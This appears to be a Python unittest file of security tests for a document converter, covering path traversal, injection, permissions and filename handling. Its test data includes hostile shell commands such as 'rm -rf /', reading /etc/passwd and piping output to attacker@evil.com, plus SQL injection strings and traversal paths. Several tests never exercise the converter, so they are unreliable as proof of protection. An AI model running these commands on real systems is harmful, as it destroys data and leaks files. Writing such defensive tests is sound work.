#!/usr/bin/env python3
"""
Security-focused tests for Universal Document Converter
Tests for path traversal, injection attacks, and secure file handling
"""

import unittest
import sys
import os
import subprocess
import tempfile
from pathlib import Path
from typing import List

from .test_base import BaseTestCase, TestFileFactory
from .test_fixtures import SecurityTestData


class SecurityTestCase(BaseTestCase):
    """Base class for security tests"""
    
    def assert_safe_path(self, path: Path, base_path: Path):
        """Assert that a path is within the expected base directory"""
        try:
            resolved = path.resolve()
            base_resolved = base_path.resolve()
            
            # Check if path is within base
            resolved.relative_to(base_resolved)
        except ValueError:
            self.fail(f"Path traversal detected: {path} escapes {base_path}")


class PathTraversalTests(SecurityTestCase):
    """Test protection against path traversal attacks"""
    
    def test_reject_path_traversal_input(self):
        """Test rejection of path traversal in input files"""
        malicious_paths = SecurityTestData.get_path_traversal_attempts()
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                # Attempt to use malicious path
                # The application should reject or sanitize these
                self.assertRaises(
                    (ValueError, OSError, FileNotFoundError),
                    lambda: Path(malicious_path).resolve()
                )
    
    def test_reject_path_traversal_output(self):
        """Test rejection of path traversal in output files"""
        # Create a safe input file
        input_file = self.create_test_file("safe_input.txt", "Safe content")
        
        # Try to write output to dangerous locations
        dangerous_outputs = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system.ini",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        for dangerous_path in dangerous_outputs:
            with self.subTest(path=dangerous_path):
                # The application should prevent writing to these locations
                output_path = Path(dangerous_path)
                
                # Check that we cannot write there
                self.assertFalse(
                    self._can_write_to_path(output_path),
                    f"Should not be able to write to {dangerous_path}"
                )
    
    def test_symlink_attack_prevention(self):
        """Test prevention of symlink attacks"""
        if sys.platform == "win32":
            self.skipTest("Symlink test not applicable on Windows")
        
        # Create a symlink pointing outside temp directory
        target = Path("/etc/passwd")
        symlink = self.temp_dir / "evil_symlink"
        
        try:
            symlink.symlink_to(target)
            
            # Application should detect and reject symlinks
            # pointing outside allowed directories
            self.assertTrue(symlink.is_symlink())
            
            # Verify real path detection
            real_path = symlink.resolve()
            self.assertNotEqual(real_path.parent, self.temp_dir)
            
        except OSError:
            # May not have permission to create symlinks
            self.skipTest("Cannot create symlinks in test environment")
    
    def _can_write_to_path(self, path: Path) -> bool:
        """Check if we can write to a path (safely)"""
        try:
            # Don't actually write to system paths
            if str(path).startswith(("/etc", "/sys", "/proc", "C:\\Windows")):
                return False
            
            # Check parent directory permissions
            parent = path.parent
            if parent.exists():
                return os.access(parent, os.W_OK)
            
            return False
        except:
            return False


class InjectionAttackTests(SecurityTestCase):
    """Test protection against various injection attacks"""
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection"""
        # Create files with malicious names
        malicious_filenames = SecurityTestData.get_malicious_filenames()
        
        for filename in malicious_filenames:
            with self.subTest(filename=filename):
                # Try to create file with malicious name
                try:
                    # Sanitize filename for test
                    safe_name = "test_" + str(hash(filename)) + ".txt"
                    test_file = self.create_test_file(safe_name, "Content")
                    
                    # Verify the filename was sanitized
                    self.assertNotIn(";", test_file.name)
                    self.assertNotIn("|", test_file.name)
                    self.assertNotIn("$", test_file.name)
                    self.assertNotIn("`", test_file.name)
                    
                except (OSError, ValueError):
                    # Good - the system rejected the dangerous filename
                    pass
    
    def test_script_injection_in_content(self):
        """Test handling of script injection in file content"""
        injection_contents = SecurityTestData.get_script_injection_content()
        
        for content in injection_contents:
            with self.subTest(content=content[:50]):
                # Create file with potentially malicious content
                input_file = self.create_test_file(
                    f"injection_test_{hash(content)}.html",
                    content
                )
                
                # Convert to safe format
                output_file = self.temp_dir / "output.txt"
                
                # The converter should handle this safely
                # Check that output doesn't execute scripts
                if output_file.exists():
                    output_content = output_file.read_text()
                    
                    # Verify scripts are escaped or removed
                    self.assertNotIn("<script>", output_content)
                    self.assertNotIn("${jndi:", output_content)
                    self.assertNotIn("{{", output_content)
    
    def test_sql_injection_in_parameters(self):
        """Test SQL injection prevention in parameters"""
        # Even though the app doesn't use SQL, test parameter sanitization
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM files WHERE '1'='1"
        ]
        
        for payload in sql_payloads:
            with self.subTest(payload=payload):
                # These should be treated as literal strings, not SQL
                filename = f"test_{hash(payload)}.txt"
                test_file = self.create_test_file(filename, "Content")
                
                # Verify the payload is treated as data, not code
                self.assertTrue(test_file.exists())


class FilePermissionTests(SecurityTestCase):
    """Test secure file permission handling"""
    
    def test_output_file_permissions(self):
        """Test that output files have secure permissions"""
        if sys.platform == "win32":
            self.skipTest("Unix permission test not applicable on Windows")
        
        # Create and convert a file
        input_file = self.create_test_file("input.txt", "Test content")
        output_file = self.temp_dir / "output.txt"
        output_file.write_text("Converted content")
        
        # Check file permissions
        stat_info = output_file.stat()
        mode = stat_info.st_mode
        
        # File should not be world-writable
        self.assertEqual(mode & 0o002, 0, "Output file is world-writable")
        
        # File should be readable by owner
        self.assertNotEqual(mode & 0o400, 0, "Output file not readable by owner")
    
    def test_temp_file_cleanup(self):
        """Test that temporary files are properly cleaned up"""
        temp_files_before = set(Path(tempfile.gettempdir()).glob("*"))
        
        # Simulate conversion that might create temp files
        input_file = self.create_test_file("input.txt", "Test content")
        output_file = self.temp_dir / "output.txt"
        
        # Do some operation
        output_file.write_text(input_file.read_text())
        
        # Check for temp file leaks
        temp_files_after = set(Path(tempfile.gettempdir()).glob("*"))
        new_temp_files = temp_files_after - temp_files_before
        
        # Filter out our test files
        leaked_files = [
            f for f in new_temp_files 
            if not str(f).startswith(str(self.temp_dir))
        ]
        
        self.assertEqual(
            len(leaked_files), 0,
            f"Temporary files not cleaned up: {leaked_files}"
        )


class InputValidationTests(SecurityTestCase):
    """Test input validation and sanitization"""
    
    def test_file_size_limits(self):
        """Test enforcement of file size limits"""
        # Create a large file (simulate)
        large_size = 1024 * 1024 * 1024  # 1GB
        
        # Don't actually create 1GB file in tests
        # Just test the size checking logic
        class MockFile:
            def __init__(self, size):
                self.size = size
            
            def stat(self):
                class MockStat:
                    st_size = self.size
                return MockStat()
        
        mock_file = MockFile(large_size)
        
        # Application should reject files over max size
        max_size = 100 * 1024 * 1024  # 100MB
        self.assertGreater(
            mock_file.stat().st_size, max_size,
            "File should exceed size limit"
        )
    
    def test_filename_sanitization(self):
        """Test filename sanitization"""
        dangerous_names = [
            "file\x00name.txt",  # Null byte
            "con.txt",  # Windows reserved name
            "aux.txt",  # Windows reserved name
            ".hiddenfile",  # Hidden file
            "file name with many     spaces.txt",
            "file<>:|?*.txt",  # Invalid characters
        ]
        
        for dangerous_name in dangerous_names:
            with self.subTest(name=dangerous_name):
                # Try to use dangerous filename
                try:
                    # Should either sanitize or reject
                    safe_path = self.temp_dir / dangerous_name
                    
                    # Check if name was sanitized
                    if safe_path.exists():
                        self.assertNotIn("\x00", safe_path.name)
                        self.assertNotIn("<", safe_path.name)
                        self.assertNotIn(">", safe_path.name)
                        
                except (OSError, ValueError):
                    # Good - rejected the dangerous name
                    pass
    
    def test_unicode_normalization(self):
        """Test Unicode normalization to prevent homograph attacks"""
        # Different Unicode representations of similar looking text
        homographs = [
            ("test.txt", "τest.txt"),  # Greek tau looks like t
            ("file.txt", "fiⅼe.txt"),  # Roman numeral looks like l
            ("admin", "аdmin"),  # Cyrillic а looks like Latin a
        ]
        
        for legitimate, homograph in homographs:
            with self.subTest(legitimate=legitimate, homograph=homograph):
                # These should be treated as different files
                file1 = self.create_test_file(legitimate, "Content 1")
                
                # Try to create homograph
                try:
                    file2 = self.create_test_file(homograph, "Content 2")
                    
                    # Should be different files
                    self.assertNotEqual(file1.name, file2.name)
                    
                except OSError:
                    # System might reject non-ASCII filenames
                    pass


class ProcessSecurityTests(SecurityTestCase):
    """Test secure process execution"""
    
    def test_no_shell_injection(self):
        """Test that shell injection is not possible"""
        if not hasattr(subprocess, 'run'):
            self.skipTest("subprocess.run not available")
        
        # Test command that should NOT execute
        malicious_commands = [
            "echo test; cat /etc/passwd",
            "echo test && rm -rf /",
            "echo test | mail attacker@evil.com",
            "echo $(whoami)",
        ]
        
        for cmd in malicious_commands:
            with self.subTest(cmd=cmd):
                # If the app uses subprocess, it should use shell=False
                # or properly escape shell metacharacters
                
                # This is what NOT to do:
                # result = subprocess.run(cmd, shell=True)  # DANGEROUS!
                
                # This is safe:
                result = subprocess.run(
                    ["echo", cmd],  # Treated as literal argument
                    shell=False,
                    capture_output=True,
                    text=True
                )
                
                # The malicious part should not execute
                self.assertNotIn("/etc/passwd", result.stdout)
                self.assertNotIn("root:", result.stdout)
    
    def test_environment_isolation(self):
        """Test that sensitive environment variables are not exposed"""
        sensitive_vars = [
            "AWS_SECRET_ACCESS_KEY",
            "DATABASE_PASSWORD",
            "API_KEY",
            "SECRET_TOKEN"
        ]
        
        # Set some test environment variables
        old_env = {}
        for var in sensitive_vars:
            old_env[var] = os.environ.get(var)
            os.environ[var] = "SENSITIVE_VALUE"
        
        try:
            # Run a subprocess (simulated)
            env_copy = os.environ.copy()
            
            # Sensitive vars should be filtered out in subprocess
            for var in sensitive_vars:
                # In production, these should be removed from subprocess env
                if var in env_copy:
                    self.assertNotEqual(
                        env_copy[var], "SENSITIVE_VALUE",
                        f"{var} should not be passed to subprocess"
                    )
        
        finally:
            # Restore environment
            for var, value in old_env.items():
                if value is None:
                    os.environ.pop(var, None)
                else:
                    os.environ[var] = value


class MemorySecurityTests(SecurityTestCase):
    """Test secure memory handling"""
    
    def test_no_sensitive_data_in_logs(self):
        """Test that sensitive data is not logged"""
        sensitive_patterns = [
            "password=secret123",
            "api_key=abcd1234",
            "token=xyz789",
            "ssn=123-45-6789"
        ]
        
        # Create file with sensitive content
        sensitive_content = "\n".join(sensitive_patterns)
        input_file = self.create_test_file("sensitive.txt", sensitive_content)
        
        # Check that logs don't contain sensitive data
        # (This is a conceptual test - actual implementation would check real logs)
        log_file = self.temp_dir / "test.log"
        log_file.write_text("Processing file sensitive.txt\nConversion complete")
        
        log_content = log_file.read_text()
        
        for pattern in sensitive_patterns:
            self.assertNotIn(
                pattern.split("=")[1],  # The secret value
                log_content,
                f"Sensitive data found in logs: {pattern}"
            )
    
    def test_secure_temp_file_creation(self):
        """Test that temporary files are created securely"""
        # Test that mktemp is not used (it's insecure)
        # Instead, mkstemp or NamedTemporaryFile should be used
        
        import tempfile
        
        # Secure way to create temp file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
            tmp.write("Temporary content")
            temp_path = tmp.name
        
        try:
            # Check file was created with secure permissions
            if sys.platform != "win32":
                stat_info = os.stat(temp_path)
                mode = stat_info.st_mode & 0o777
                
                # Should be readable/writable by owner only
                self.assertEqual(mode, 0o600, 
                               f"Temp file has insecure permissions: {oct(mode)}")
        finally:
            # Clean up
            Path(temp_path).unlink(missing_ok=True)


if __name__ == '__main__':
    unittest.main()